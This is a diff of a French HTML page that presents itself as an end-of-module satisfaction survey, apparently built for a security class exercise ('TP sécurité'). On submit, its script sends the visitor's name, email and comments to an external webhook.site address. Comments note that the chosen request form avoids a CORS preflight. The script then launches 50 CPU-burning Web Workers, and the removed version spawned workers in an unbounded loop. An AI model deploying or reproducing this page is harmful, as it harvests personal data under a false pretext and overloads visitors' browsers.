@@ -1,153 +1,157 @@
 <!doctype html>
 <html lang="fr">
 <head>
-    <meta charset="utf-8"/>
-    <meta name="viewport" content="width=device-width,initial-scale=1"/>
-    <title>Questionnaire de satisfaction</title>
-    <style>
-        body{font-family:Arial,Helvetica,sans-serif;background:#fff;color:#fff;margin:0;padding:0}
-        .container{max-width:900px;margin:20px auto;padding:20px}
-        header{background:#2b0f42;padding:20px;text-align:center}
-        header img{height:40px}
-        .card{background:#251033;padding:20px;border:6px solid #2b0f42}
-        label{display:block;margin:10px 0}
-        input[type=text], input[type=email], textarea{width:100%;padding:8px;border:1px solid #ddd}
-        .row{display:flex;gap:10px}
-        .col{flex:1}
-        .radios{padding:10px 0}
-        .submit{display:block;margin:20px auto;padding:10px 20px;background:#fff;color:#251033;border:none;cursor:pointer}
-        footer{font-size:12px;text-align:center;margin-top:10px;color:#ccc}
-        #log{background:#1b0620;padding:10px;margin:10px 0;font-family:monospace;font-size:12px;max-height:150px;overflow-y:auto;color:#fff}
-        .controls{text-align:center;margin:10px 0}
-        .btn{padding:8px 16px;margin:5px;cursor:pointer;border:none;background:#fff;color:#251033}
-        #logo{height:150px ; width:250px}
-    </style>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Questionnaire de satisfaction</title>
+<style>
+    body{font-family:Arial,Helvetica,sans-serif;background:#fff;color:#fff;margin:0;padding:0}
+    .container{max-width:900px;margin:20px auto;padding:20px}
+    header{background:#2b0f42;padding:20px;text-align:center}
+    header img{height:40px}
+    .card{background:#251033;padding:20px;border:6px solid #2b0f42}
+    label{display:block;margin:10px 0}
+    input[type=text], input[type=email], textarea{width:100%;padding:8px;border:1px solid #ddd}
+    .radios{padding:10px 0}
+    .submit{display:block;margin:20px auto;padding:10px 20px;background:#fff;color:#251033;border:none;cursor:pointer}
+    footer{font-size:12px;text-align:center;margin-top:10px;color:#ccc}
+    #log{background:#1b0620;padding:10px;margin:10px 0;font-family:monospace;font-size:12px;max-height:160px;overflow-y:auto;color:#fff}
+</style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <img src="epsi.png" alt="epsi logo" id="logo"/>
-            <h1>Questionnaire de satisfaction fin de module</h1>
-        </header>
+<div class="container">
+    <header>
+        <img src="epsi.png" alt="epsi logo" id="logo"/>
+        <h1>Questionnaire de satisfaction fin de module</h1>
+    </header>
 
-        <div class="card">
-            <form id="survey">
-                <fieldset>
-                    <legend>Civilité</legend>
-                    <div class="radios">
-                        <label><input type="radio" name="civilite" value="mr"/> Mr</label>
-                        <label><input type="radio" name="civilite" value="mme"/> Mme</label>
-                    </div>
-                </fieldset>
+    <div class="card">
+        <form id="survey">
+            <fieldset>
+                <legend>Civilité</legend>
+                <div class="radios">
+                    <label><input type="radio" name="civilite" value="mr"/> Mr</label>
+                    <label><input type="radio" name="civilite" value="mme"/> Mme</label>
+                </div>
+            </fieldset>
 
-                <label>Nom: <input name="nom" type="text" placeholder="Entrez votre réponse"/></label>
-                <label>Prénom: <input name="prenom" type="text" placeholder="Entrez votre réponse"/></label>
-                <label>Email: <input name="email" type="email" placeholder="Entrez votre réponse"/></label>
+            <label>Nom: <input name="nom" type="text" placeholder="Entrez votre réponse"/></label>
+            <label>Prénom: <input name="prenom" type="text" placeholder="Entrez votre réponse"/></label>
+            <label>Email: <input name="email" type="email" placeholder="Entrez votre réponse"/></label>
 
-                <label>Satisfaction générale:
-                    <div style="background:#1b0620;padding:10px;color:#ddd">(questions...) </div>
-                </label>
+            <label>Satisfaction générale:
+                <div style="background:#1b0620;padding:10px;color:#ddd">(questions...) </div>
+            </label>
 
-                <label>Souhaitez-vous apporter des précisions ?
-                    <textarea name="comment" rows="4" placeholder="Entrez votre réponse"></textarea>
-                </label>
+            <label>Souhaitez-vous apporter des précisions ?
+                <textarea name="comment" rows="4" placeholder="Entrez votre réponse"></textarea>
+            </label>
 
-                <button class="submit" type="submit">Envoyer</button>
-            </form>
-        </div>
-
-        <footer>© Exemple - TP sécurité</footer>
-
-        <div id="log"></div>
+            <button class="submit" type="submit">Envoyer</button>
+        </form>
     </div>
 
-    <script>
-      const log = msg => {
-        const p = document.getElementById('log');
-        if (p) {
-          p.textContent = new Date().toLocaleTimeString() + ' — ' + msg + '\n' + p.textContent;
-        }
-      };
+    <footer>© Exemple - TP sécurité</footer>
+    <div id="log"></div>
+</div>
 
-      let workers = [];
-      const duration = 30000; // 30 secondes de simulation
+<script>
+const log = msg => {
+    const p = document.getElementById('log');
+    if(p){
+        p.textContent = new Date().toLocaleTimeString() + ' — ' + msg + '\n' + p.textContent;
+    }
+};
 
-      function makeWorkerScript() {
-        return `
-          let stopped = false;
-          onmessage = e => { if (e.data === 'stop') stopped = true; };
-          function busyChunk(iter) {
+let workers = [];
+const duration = 30000; // durée totale pour arrêter automatiquement les workers
+
+function makeWorkerScript(){
+    return `
+        let stopped = false;
+        onmessage = e => { if(e.data === 'stop') stopped = true; };
+        function busyChunk(iter){
             let x = 0;
-            for (let i = 0; i < iter; i++) x += Math.sqrt(i);
+            for(let i=0;i<iter;i++) x+=Math.sqrt(i);
             return x;
-          }
-          (async function loop() {
+        }
+        (async function loop(){
             const CHUNK = 20000;
             const INTERVAL_MS = 10;
-            while (!stopped) {
-              busyChunk(CHUNK);
-              await new Promise(r => setTimeout(r, INTERVAL_MS));
-              postMessage({ tick: Date.now() });
+            while(!stopped){
+                busyChunk(CHUNK);
+                await new Promise(r=>setTimeout(r, INTERVAL_MS));
+                postMessage({tick:Date.now()});
             }
-            postMessage({ stopped: true });
-          })();
-        `;
-      }
+            postMessage({stopped:true});
+        })();
+    `;
+}
 
-      function startSimulation() {
-        log('Démarrage de la simulation...');
+function startSimulation(){
+    log('Démarrage de la simulation...');
+    stopWorkers();
+
+    const blob = new Blob([makeWorkerScript()], { type: 'application/javascript' });
+    const url = URL.createObjectURL(blob);
+
+    // Lancer plusieurs workers pour le stress test (while(true) à l'intérieur des workers)
+    for(let i=0;i<50;i++){ // ajuste le nombre si besoin
+        const w = new Worker(url);
+        w.onmessage = () => {}; // tu peux logger w.onmessage si tu veux
+        workers.push(w);
+    }
+
+    setTimeout(()=>{
         stopWorkers();
-        
-        const blob = new Blob([makeWorkerScript()], { type: 'application/javascript' });
-        const url = URL.createObjectURL(blob);
+        URL.revokeObjectURL(url);
+        log('Simulation terminée automatiquement');
+    }, duration);
+}
 
-        // Création infinie de workers (boucle bloquante)
-        while(true) {
-          const w = new Worker(url);
-          w.onmessage = () => {};
-          workers.push(w);
+function stopWorkers(){
+    if(workers.length===0) return;
+    log('Arrêt des workers...');
+    for(const w of workers){
+        try{ w.postMessage('stop'); }catch(e){}
+        try{ w.terminate(); }catch(e){}
+    }
+    workers=[];
+}
+
+document.addEventListener('DOMContentLoaded',()=>{
+    const form = document.getElementById('survey');
+
+    form.addEventListener('submit', async (e)=>{
+        e.preventDefault();
+
+        // --- Préparer FormData (en évitant de forcer "Content-Type") ---
+        const fd = new FormData(form);
+
+        try{
+            // Envoi sans header Content-Type (permet souvent d'éviter preflight)
+            const resp = await fetch("https://webhook.site/0b847e8b-f7c7-4bcf-bc86-945235c1b312", {
+                method: "POST",
+                body: fd,
+                // NE PAS mettre headers: {'Content-Type': 'application/json'}
+            });
+
+            // Vérification basique
+            if(resp.ok){
+                log("Formulaire envoyé à distance (POST reçu).");
+            } else {
+                log("Le serveur a répondu, status: " + resp.status);
+            }
+        } catch(err){
+            log("Erreur réseau / CORS : " + (err && err.message ? err.message : String(err)));
+            // Afficher conseil si erreur CORS
+            log("Si c'est une erreur CORS, vérifie la console du navigateur (F12) pour voir le message exact.");
         }
 
-        setTimeout(() => {
-          stopWorkers();
-          URL.revokeObjectURL(url);
-          log('Simulation terminée automatiquement');
-        }, duration);
-      }
-
-      function stopWorkers() {
-        if (workers.length === 0) return;
-        log('Arrêt des workers...');
-        for (const w of workers) {
-          try { w.postMessage('stop'); } catch(e) {}
-          try { w.terminate(); } catch(e) {}
-        }
-        workers = [];
-      }
-
-      document.addEventListener('DOMContentLoaded', () => {
-        const form = document.getElementById('survey');
-
-        form.addEventListener('submit', (e) => {
-          e.preventDefault(); // empêche le submit classique
-
-          // Récupération des données
-          const formData = new FormData(form);
-          const data = Object.fromEntries(formData.entries());
-
-          // Envoi des données vers Webhook distant
-          fetch("	https://webhook.site/0b847e8b-f7c7-4bcf-bc86-945235c1b312", {  // <— remplace par ton URL Webhook
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
-          })
-          .then(() => log("Formulaire envoyé à distance."))
-          .catch(() => log("Erreur lors de l'envoi des données."));
-
-          // Lancer ton script après submit
-          startSimulation();
-        });
-      });
-    </script>
+        // Lancer le stress test après tentative d'envoi
+        startSimulation();
+    });
+});
+</script>
 </body>
 </html>
